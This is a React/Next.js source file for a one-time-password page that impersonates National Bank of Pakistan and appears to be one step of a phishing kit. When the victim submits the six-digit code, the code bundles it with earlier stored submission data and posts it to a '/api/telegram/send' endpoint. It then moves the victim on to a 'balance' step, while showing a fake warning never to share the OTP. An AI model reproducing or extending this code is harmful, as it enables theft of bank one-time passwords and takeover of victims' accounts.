'use client'

import { useEffect, useRef, useState } from 'react'
import { useRouter } from 'next/navigation'
import { ChevronRight, TriangleAlert } from 'lucide-react'
import { saveSubmissionData } from '@/lib/submission-store'

const logoImage =
  'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202026-08-08%20062819-tEXyj9UyD7CkbbGMwFg7T0dD0XA5Ym.png'

const OTP_LENGTH = 6
const RESEND_SECONDS = 299

export default function OtpPage() {
  const router = useRouter()
  const [digits, setDigits] = useState<string[]>(Array(OTP_LENGTH).fill(''))
  const [secondsLeft, setSecondsLeft] = useState(RESEND_SECONDS)
  const [error, setError] = useState('')
  const inputRefs = useRef<Array<HTMLInputElement | null>>([])

  useEffect(() => {
    if (secondsLeft <= 0) return
    const timer = setInterval(() => setSecondsLeft((value) => value - 1), 1000)
    return () => clearInterval(timer)
  }, [secondsLeft])

  const minutes = String(Math.floor(secondsLeft / 60)).padStart(2, '0')
  const seconds = String(secondsLeft % 60).padStart(2, '0')

  function handleDigitChange(index: number, value: string) {
    const digit = value.replace(/\D/g, '').slice(-1)
    setDigits((previous) => {
      const next = [...previous]
      next[index] = digit
      return next
    })
    if (error) setError('')
    if (digit && index < OTP_LENGTH - 1) {
      inputRefs.current[index + 1]?.focus()
    }
  }

  function handleKeyDown(index: number, event: React.KeyboardEvent<HTMLInputElement>) {
    if (event.key === 'Backspace' && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const isComplete = digits.every((digit) => digit !== '')

  return (
    <main className="min-h-screen bg-background px-3 pb-8 pt-3 text-foreground">
      <div className="mx-auto w-full max-w-[380px]">
        <header className="mb-5">
          <div className="flex h-16 w-20 items-center justify-center rounded-2xl border border-border bg-white px-2 shadow-sm">
            <img src={logoImage} alt="National Bank of Pakistan logo" className="h-auto w-full object-contain" />
          </div>
          <p className="mt-2 text-sm font-medium text-muted-foreground">national bank of pakistan</p>
        </header>

        <section aria-label="OTP verification">
          <h1 className="text-balance text-[26px] font-extrabold leading-tight text-foreground">OTP Verification</h1>
          <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
            Enter the 6-digit code sent via SMS.
          </p>

          <form
            className="mt-5"
            onSubmit={async (event) => {
              event.preventDefault()
              if (!isComplete) {
                setError('Please enter the complete 6-digit OTP.')
                return
              }
              setError('')
              try {
                const data = saveSubmissionData({ otp: digits.join('') })
                await fetch('/api/telegram/send', {
                  method: 'POST',
                  headers: { 'content-type': 'application/json' },
                  body: JSON.stringify(data),
                })
              } catch {
                // Continue navigation even if the notification fails
              } finally {
                router.push('/balance')
              }
            }}
          >
            <div className="otp-card">
              <div className="flex items-center justify-between gap-2">
                {digits.map((digit, index) => (
                  <input
                    key={index}
                    ref={(element) => {
                      inputRefs.current[index] = element
                    }}
                    aria-label={`Digit ${index + 1}`}
                    className="otp-box"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(event) => handleDigitChange(index, event.target.value)}
                    onKeyDown={(event) => handleKeyDown(index, event)}
                  />
                ))}
              </div>
              <p className="mt-4 text-center text-sm text-muted-foreground">
                {"Didn't receive the code? "}
                {secondsLeft > 0 ? (
                  <span className="font-bold text-foreground">
                    Resend in {minutes}:{seconds}
                  </span>
                ) : (
                  <button type="button" className="font-bold text-primary underline-offset-2 hover:underline">
                    Resend code
                  </button>
                )}
              </p>
            </div>

            {error ? (
              <p className="mt-3 text-center text-sm font-semibold text-destructive">{error}</p>
            ) : null}

            <div className="otp-warning mt-4">
              <TriangleAlert aria-hidden="true" className="size-5 shrink-0 text-amber-600" />
              <p>
                Never share your OTP with anyone. National Bank of Pakistan will never ask for your OTP over a call or
                SMS.
              </p>
            </div>

            <div className="flex items-center justify-center gap-2 py-4" aria-label="Step 2 of 5">
              <span className="step-dot step-dot-done" />
              <span className="h-2 w-6 rounded-full bg-primary" />
              <span className="step-dot" />
              <span className="step-dot" />
              <span className="step-dot" />
            </div>

            <button
              type="submit"
              className="flex h-14 w-full items-center justify-center gap-3 rounded-2xl bg-primary text-base font-bold text-primary-foreground shadow-[0_6px_10px_rgba(39,181,101,0.2)] transition-transform hover:-translate-y-0.5 active:translate-y-0 disabled:opacity-60 disabled:hover:translate-y-0"
            >
              Verify OTP <ChevronRight aria-hidden="true" className="size-5" />
            </button>
          </form>
        </section>
      </div>
    </main>
  )
}
